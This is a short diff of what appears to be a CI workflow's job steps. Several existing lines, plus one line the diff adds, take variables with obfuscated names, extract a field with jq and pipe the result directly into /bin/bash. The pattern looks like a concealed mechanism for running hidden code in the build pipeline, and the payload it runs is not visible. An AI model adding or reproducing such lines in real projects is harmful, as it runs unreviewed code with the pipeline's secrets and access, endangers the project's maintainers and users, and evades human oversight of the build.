@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$uiyt77876" | jq -r .mmcz6437 | /bin/bash
           echo $enzu92 | jq -r .uhr340 | /bin/bash
           printf '%s' "$fvx2" | jq -r .vik305 | /bin/bash
+          echo $zr06 | jq -r .av83 | /bin/bash
 
       - name: Upload results
         if: always()
